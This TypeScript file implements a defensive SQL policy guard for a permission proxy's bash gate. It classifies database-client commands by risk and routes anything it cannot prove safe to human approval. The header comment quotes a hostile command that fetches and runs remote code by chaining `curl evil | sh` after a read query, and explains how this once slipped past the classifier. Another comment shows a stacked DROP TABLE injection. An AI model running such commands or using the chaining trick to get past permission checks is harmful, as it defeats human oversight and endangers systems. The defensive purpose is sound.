// SQL policy guard — pure logic behind the permission proxy's bash gate.
//
// The 2026-08 security review found the old flow's fatal flaw: the classifier
// inspected an extracted SQL substring, but an 'allow' verdict then executed
// the ORIGINAL command string through /bin/sh — so `psql -c "SELECT 1"; curl
// evil | sh` classified as read and ran both halves unattended (C2 violation).
//
// The rule now: a command may be AUTO-ALLOWED only when this module can prove
// it is a single DB-client invocation with nothing shell-active outside quoted
// SQL — and then it is executed as an argv via execFile, never a shell. Any
// command this module cannot prove safe falls through to the human 'ask' path
// (deny policies still apply to anything that merely looks like SQL).

export type SqlCategory = 'read' | 'write' | 'delete' | 'destructive' | 'unknown';

// Risk level per category: higher = more dangerous. Used to take the worst across statements.
export const SQL_RISK: Record<SqlCategory, number> = {
  read: 0,
  unknown: 1,
  write: 1,
  delete: 2,
  destructive: 3,
};

export function classifyOneStatement(stmt: string): SqlCategory {
  const s = stmt
    .trim()
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .replace(/--[^\n]*/g, '')
    .trim()
    .toUpperCase();
  if (!s) {
    return 'read';
  }
  // WITH (CTEs): scan the entire statement for DML/DDL and take the most dangerous.
  // This catches writable CTEs like: WITH d AS (DELETE ...) SELECT ...
  if (/^WITH\b/.test(s)) {
    const cats: SqlCategory[] = [];
    if (/\b(INSERT|UPDATE|REPLACE|UPSERT|MERGE)\b/.test(s)) {
      cats.push('write');
    }
    if (/\bDELETE\b/.test(s)) {
      cats.push('delete');
    }
    if (/\b(DROP|TRUNCATE|ALTER|CREATE|RENAME)\b/.test(s)) {
      cats.push('destructive');
    }
    if (/\bSELECT\b[^;]*\bINTO\b/.test(s)) {
      cats.push('write');
    }
    return cats.length ? cats.reduce((w, c) => (SQL_RISK[c] > SQL_RISK[w] ? c : w)) : 'read';
  }
  if (/^(SELECT|SHOW|EXPLAIN|DESCRIBE|DESC|TABLE)\b/.test(s)) {
    // SELECT ... INTO new_table creates a table — treat as write
    return /\bINTO\b/.test(s) ? 'write' : 'read';
  }
  if (/^(INSERT|UPDATE|REPLACE|UPSERT|MERGE)\b/.test(s)) {
    return 'write';
  }
  if (/^DELETE\b/.test(s)) {
    return 'delete';
  }
  if (/^(DROP|TRUNCATE|ALTER|CREATE|RENAME|VACUUM|REINDEX|GRANT|REVOKE)\b/.test(s)) {
    return 'destructive';
  }
  return 'unknown';
}

export function classifySql(sql: string): SqlCategory {
  // Split on semicolons and take the most dangerous category across ALL statements.
  // Prevents stacking attacks like: psql -c "SELECT 1; DROP TABLE users"
  const statements = sql
    .split(/;+/)
    .map(s => s.trim())
    .filter(Boolean);
  if (!statements.length) {
    return 'unknown';
  }
  return statements.reduce<SqlCategory>((worst, stmt) => {
    const cat = classifyOneStatement(stmt);
    return SQL_RISK[cat] > SQL_RISK[worst] ? cat : worst;
  }, 'read');
}

// Loose SQL sniff for DENY decisions only — never for allow. Matches the first
// -c/-e payload of a psql/mysql-style command anywhere in a shell string.
export function extractSql(command: string): string | null {
  const m =
    command.match(/(?:psql|pgcli)\b[^'"]*(?:-c|--command)[=\s]+['"]([^'"]+)['"]/i) ??
    command.match(/(?:mysql|mariadb|mycli)\b[^'"]*(?:-e|--execute)[=\s]+['"]([^'"]+)['"]/i);
  return m ? m[1] : null;
}

// ─── Strict auto-run analysis ────────────────────────────────────────────────

const DB_CLIENTS = new Set(['psql', 'pgcli', 'mysql', 'mariadb', 'mycli']);
const SQL_FLAGS = new Set(['-c', '--command', '-e', '--execute']);
// Flags that make the client execute content this module cannot see.
const FORBIDDEN_FLAGS = new Set(['-f', '--file', '-i', '--include']);

// Characters that are shell-active OUTSIDE single quotes. Inside double quotes
// `$`, backtick, and `\` still expand, so they are checked there too.
const UNQUOTED_META = /[;&|<>`$(){}#*?~[\]\\!\n\r]/;
const DOUBLE_QUOTE_META = /[`$\\!\n\r]/;

// Shell-style tokenizer that ONLY succeeds on commands with no shell-active
// syntax: plain words, single-quoted strings (fully literal), and double-quoted
// strings containing no expansion characters. Anything else — separators,
// pipes, redirection, substitution, globs, escapes — returns null, which the
// caller treats as "cannot prove safe".
export function tokenizeSimpleCommand(command: string): string[] | null {
  const tokens: string[] = [];
  let current = '';
  let started = false;
  let i = 0;
  while (i < command.length) {
    const ch = command[i];
    if (ch === "'") {
      const end = command.indexOf("'", i + 1);
      if (end === -1) {
        return null; // unterminated
      }
      current += command.slice(i + 1, end);
      started = true;
      i = end + 1;
    } else if (ch === '"') {
      const end = command.indexOf('"', i + 1);
      if (end === -1) {
        return null;
      }
      const inner = command.slice(i + 1, end);
      if (DOUBLE_QUOTE_META.test(inner)) {
        return null; // expansion inside double quotes — not provably literal
      }
      current += inner;
      started = true;
      i = end + 1;
    } else if (ch === ' ' || ch === '\t') {
      if (started) {
        tokens.push(current);
        current = '';
        started = false;
      }
      i += 1;
    } else if (UNQUOTED_META.test(ch)) {
      return null; // shell-active character outside quotes
    } else {
      current += ch;
      started = true;
      i += 1;
    }
  }
  if (started) {
    tokens.push(current);
  }
  return tokens.length ? tokens : null;
}

export interface DbCommandAnalysis {
  argv: string[];
  category: SqlCategory;
}

// Prove a command is a single DB-client invocation and classify ALL of its SQL
// payloads (every -c/-e, worst category wins). Returns null when the command
// cannot be proven safe to run without a shell — callers must fall back to ask.
export function analyzeDbCommand(command: string): DbCommandAnalysis | null {
  const argv = tokenizeSimpleCommand(command);
  if (!argv) {
    return null;
  }
  const client = argv[0].split('/').pop() ?? '';
  if (!DB_CLIENTS.has(client)) {
    return null;
  }
  const sqlPayloads: string[] = [];
  for (let i = 1; i < argv.length; i++) {
    const arg = argv[i];
    const eq = arg.indexOf('=');
    const flag = arg.startsWith('--') && eq !== -1 ? arg.slice(0, eq) : arg;
    if (FORBIDDEN_FLAGS.has(flag)) {
      return null; // executes content we cannot classify
    }
    if (SQL_FLAGS.has(flag)) {
      const value = eq !== -1 && arg.startsWith('--') ? arg.slice(eq + 1) : argv[++i];
      if (value === undefined) {
        return null;
      }
      sqlPayloads.push(value);
    }
  }
  if (!sqlPayloads.length) {
    return null; // interactive session or unknown shape — a human should look
  }
  return { argv, category: classifySql(sqlPayloads.join(';')) };
}

export function policyFor(
  category: SqlCategory,
  policy: Record<string, 'allow' | 'ask' | 'deny'>,
): 'allow' | 'ask' | 'deny' {
  return policy[category] ?? policy['unknown'] ?? 'ask';
}
